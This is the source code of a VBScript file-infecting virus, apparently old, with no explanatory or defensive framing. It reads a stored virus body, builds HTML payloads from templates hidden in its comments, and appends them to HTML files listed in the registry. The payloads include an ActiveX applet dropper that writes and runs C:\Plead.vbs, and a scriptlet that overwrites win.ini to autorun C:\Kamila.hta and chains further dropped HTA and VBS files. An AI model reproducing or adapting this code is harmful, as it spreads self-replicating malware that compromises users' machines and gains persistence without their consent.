Option Explicit
On Error Resume Next 'Keine Fehler!!!

Dim wshShell
Dim fso
Dim strCopiedBody, strApplet, strScriptlet
Dim strReg
Const tempReg="HKLM\Security\Provider\" 'do not chage this

Sub Sleep(seconds)
	On Error Resume Next
	Dim a1,a2
	a1=Hour(Now)*3600+Minute(Now)*60+Second(Now)
	a2=a1
	While (a2-a1<seconds)
		a2=Hour(Now)*3600+Minute(Now)*60+Second(Now)
	Wend
End Sub

Function MakeCopy()
	On Error Resume Next 'Keine Fehler!!!
	Dim fileDll
	Set fileDll=fso.OpenTextFile(wshShell.RegRead(strReg) & "." & wshShell.RegRead(strReg & "Vars\%DLL_EXT%"),1)
	MakeCopy=fileDll.ReadAll
	fileDll.Close
	Set fileDll=Nothing
End Function

Function MakeBodyApplet()
	On Error Resume Next 'Keine Fehler!!!
	Dim file1
	Dim strIn, strBody, strCode, strRes
	
	strBody=strCopiedBody
	Set file1=fso.OpenTextFile(WScript.ScriptFullName,1)
	While Not file1.AtEndOfStream
		strIn=file1.ReadLine
		If UCase(strIn)="'<--CODE_APPLET_DROPPER-->" Then
			strIn=file1.ReadLine
			While UCase(strIn)<>"'<--/CODE_APPLET_DROPPER-->"
				If strIn="'<textarea name=""txtBody"" style=""display:none"">" Then
					strRes=strRes & Right(strIn,Len(strIn)-1) & vbCrLf & strBody & vbCrLf
				Else
					strRes=strRes & Right(strIn,Len(strIn)-1) & vbCrLf
				End If
				strIn=file1.ReadLine
			Wend
		End If
	Wend
	file1.Close
	MakeBodyApplet=strRes
	Set file1=Nothing
End Function



Function MakeBodyScriptlet()
	On Error Resume Next 'Keine Fehler!!!
	Dim file1
	Dim strIn, strBody, strBody2, strRes
	Dim int1
	
	int1=Int(Len(strCopiedBody)/2)
	strBody=Left(strCopiedBody,int1-1)
	strBody2=Mid(strCopiedBody,int1)
	Set file1=fso.OpenTextFile(WScript.ScriptFullName,1)
	While Not file1.AtEndOfStream
		strIn=file1.ReadLine
		If UCase(strIn)="'<--CODE_SCRIPTLET-->" Then
			strIn=file1.ReadLine
			While UCase(strIn)<>"'<--/CODE_SCRIPTLET-->"
				If strIn="'<textarea name=""txtBody1"" style=""display:none"">" Then
					strRes=strRes & Right(strIn,Len(strIn)-1) & vbCrLf & strBody & vbCrLf & vbCrLf & vbCrLf
				ElseIf strIn="'<textarea name=""txtBody2"" style=""display:none"">" Then
					strRes=strRes & Right(strIn,Len(strIn)-1) & vbCrLf & strBody2 & vbCrLf & vbCrLf
				Else
					strRes=strRes & Right(strIn,Len(strIn)-1) & vbCrLf
				End If
				strIn=file1.ReadLine
			Wend
		End If
	Wend
	file1.Close
	MakeBodyScriptlet=strRes
	Set file1=Nothing
End Function

Sub InfectHTML(strPath)
	On Error Resume Next 'Keine Fehler!!!
	Dim file1
	Dim strHTML
	Dim blBody,blHtml
	Dim int1,int2
	blBody=False
	blHtml=False
	Set file1=fso.OpenTextFile(strPath,1)
	strHTML=file1.ReadAll
	file1.Close
	Set file1=fso.OpenTextFile(strPath,2)
	int2=InStr(UCase(strHTML),UCase("</html>"))
	If int2>0 Then
		blHtml=True
		strHTML=Left(strHTML,int2-1)
	End If
	int1=InStr(UCase(strHTML),UCase("</body>"))
	If int1>0 Then
		blBody=True
		strHTML=Left(strHTML,int1-1)
	End If
	int2=Int(50*Rnd+1)
	If int2>27 Then strHTML=strHTML & vbCrLf & strScriptlet Else strHTML=strHTML & vbCrLf & strApplet
	If blBody Then strHTML=strHTML & vbCrLf & "</body>"
	If blHTML Then strHTML=strHTML & vbCrLf & "</html>"
	file1.Write strHTML
	file1.Close
	Set file1=Nothing
End Sub

Sub BeginInfecting()
	On Error Resume Next 'Keine Fehler!!!
	Dim i, n, nIn, total
	Dim int1, str1
	n=CInt(wshShell.RegRead(strReg & "Components\HTMLIndex\Total files"))
	nIn=CInt(wshShell.RegRead(strReg & "Components\HTMLIndex\Infected files"))
	int1=Int(11*Rnd+20)
	total=0
	For i=nIn+1 To nin+int1
		If i>n Then Exit For
		total=total+1
		str1=CStr(wshShell.RegRead(strReg & "Components\HTMLIndex\File" & i))
		If fso.FileExists(str1) Then InfectHTML(str1)
	Next
	wshShell.RegWrite strReg & "Components\HTMLIndex\Infected files",nIn+total,"REG_DWORD"
End Sub

'Sleep(81)
Randomize Timer
Set wshShell=WScript.CreateObject("WScript.Shell")
Set fso=WScript.CreateObject("Scripting.FileSystemObject")
strReg=wshShell.RegRead(tempReg)
strCopiedBody=MakeCopy()
strApplet=MakeBodyApplet()
strScriptlet=MakeBodyScriptlet()
'Call BeginInfecting()
Dim a
Set a=fso.CreateTextFile("D:\1.htm")
a.write MakeBodyScriptlet()
a.close
WScript.DisconnectObject wshShell
WScript.DisconnectObject fso
Set wshShell=Nothing
Set fso=Nothing


'<--CODE_APPLET_DROPPER-->
'<textarea name="txtBody" style="display:none">
'</textarea>
'<applet code="com.ms.activeX.ActiveXComponent" style="display:none"></applet> 
'<applet code="com.ms.activeX.ActiveXComponent" style="display:none"></applet> 
'
'<SCRIPT LANGUAGE="JAVASCRIPT"> 
'	a1=document.applets[0]; 
'	a2=document.applets[1];
'
'	function f2()
'	{
'		a1.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}");
'		a1.createInstance();
'		a=a1.invoke('createtextfile',ARGS1);
'		str1=txtBody.value;
'		a.write(str1);
'		a.close();
'		a2.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}");
'		a2.createInstance();
'		a2.invoke('run',ARGS2);
'	}
'	setTimeout("f2()",3000)
'</SCRIPT> 
'
'<SCRIPT LANGUAGE="VBSCRIPT"> 
'ARGS1=Array("C:\Plead.vbs")
'ARGS2=Array("C:\Plead.vbs")
'</SCRIPT>
'<--/CODE_APPLET_DROPPER-->




'<--CODE_SCRIPTLET-->
'<textarea name="txtWinIni" style="display:none">
'
'
'[windows]
'load=
'run=C:\Kamila.hta
'
'
'</textarea>
'<textarea name="txtBody1" style="display:none">
'</textarea>
'<textarea name="txtBody2" style="display:none">
'</textarea>
'<object id="WinIni" classid="clsid:06290BD5-48AA-11D2-8432-006008C3FBFC"></object>
'<script language="JavaScript">
'	function WinIni_Drop()
'	{
'		var dirs=new Array('WINDOWS','WIN95','WIN98','WINNT','WIN2000','WINOS','OS95','OS98','Win.95','Win.98','Windows.95','Windows.98','Windows95','Windows98');
'		var i;
'		for (i=0;i<dirs.length;i++)
'		{
'			try {
'			WinIni.Reset();
'			WinIni.Path="C:\\"+dirs[i]+"\\win.ini";
'			WinIni.Doc=txtWinIni.value;
'			WinIni.Write();
'			}
'			catch(e) { }
'		}
'	}
'	function Kamila_Drop()
'	{
'		var crlf=String.fromCharCode(13,10);
'		var strBody, str1;
'		str1=txtBody1.value;
'		strBody=crlf+'<textarea name="txtCode" style="display:none">'+crlf;
'		strBody+=str1+crlf+'</textarea>'+crlf;
'		strBody+='<script>'+crlf;
'		strBody+='var fso=new ActiveXObject("Scripting.FileSystemObject");'+crlf;
'		strBody+='var a=fso.CreateTextFile("C:\\\\Kam_drop.vbs");'+crlf;
'		strBody+='var str1=txtCode.value;'+crlf;
'		strBody+='a.write(str1.substr(0,str1.length-4));'+crlf;
'		strBody+='a.close();'+crlf;
'		strBody+='var wsh=new ActiveXObject("WScript.Shell");'+crlf;
'		strBody+='wsh.run("C:\\\\Drop2.hta");'+crlf;
'		strBody+='</s'+'cript>'+crlf;
'		WinIni.Reset();
'		WinIni.Path="C:\\Kamila.hta";
'		WinIni.Doc=strBody;
'		WinIni.Write();
'	}
'	function Drop_Again()
'	{
'		var strBody;
'		var crlf=String.fromCharCode(13,10);
'		strBody=crlf+'<textarea name="txtCode" style="display:none">'+crlf;
'		strBody+=txtBody2.value+crlf+'</textarea>'+crlf;
'		strBody+='<script>'+crlf;
'		strBody+='var fso=new ActiveXObject("Scripting.FileSystemObject");'+crlf;
'		strBody+='var a=fso.OpenTextFile("C:\\\\Kam_drop.vbs",8);'+crlf;
'		strBody+='a.write(txtCode.value);'+crlf;
'		strBody+='a.close();'+crlf;
'		strBody+='var wsh=new ActiveXObject("WScript.Shell");'+crlf;
'		strBody+='wsh.run("C:\\\\Kam_drop.vbs");'+crlf;
'		strBody+='</s'+'cript>'+crlf;
'		WinIni.Reset();
'		WinIni.Path="C:\\Drop2.hta";
'		WinIni.Doc=strBody;
'		WinIni.Write();
'	}
'	WinIni_Drop();
'	Kamila_Drop();
'	Drop_Again();
'</script>
'<--/CODE_SCRIPTLET-->

